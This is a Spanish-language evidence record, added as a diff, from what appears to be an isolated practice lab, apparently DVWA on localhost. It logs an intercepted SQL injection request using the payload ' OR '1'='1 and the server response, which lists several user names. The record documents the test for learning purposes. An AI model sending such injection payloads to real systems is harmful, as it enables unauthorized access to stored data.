@@ -1,0 +1,32 @@
+EVIDENCIA - INTERCEPTACION DE LA PETICION HTTP (equivalente a BurpSuite Proxy/Repeater)
+Fecha: 2026-10-26 21:55  |  Objetivo: http://127.0.0.1:4280 (lab aislado)
+Se intercepta la peticion del ataque de Inyeccion SQL y su respuesta.
+================================================================
+
+>>> PETICION HTTP ENVIADA (con el payload inyectado):
+GET /vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit HTTP/1.1
+Host: 127.0.0.1:4280
+Cookie: PHPSESSID=n52kjfj94hl97q1ht0j2joadp4; security=low
+
+>>> RESPUESTA DEL SERVIDOR (cabeceras + fragmento del cuerpo):
+HTTP/1.1 200 OK
+Date: Tue, 27 Oct 2026 02:55:24 GMT
+Server: Apache/2.4.25 (Debian)
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 4907
+Content-Type: text/html;charset=utf-8
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+    [...]
+    First name: admin
+    First name: Gordon
+    First name: Hack
+    First name: Pablo
+    First name: Bob
+
+LECTURA: la peticion manipulada se envia al servidor y la respuesta (HTTP 200)
+revela multiples usuarios -> confirma la vulnerabilidad interceptando el trafico.
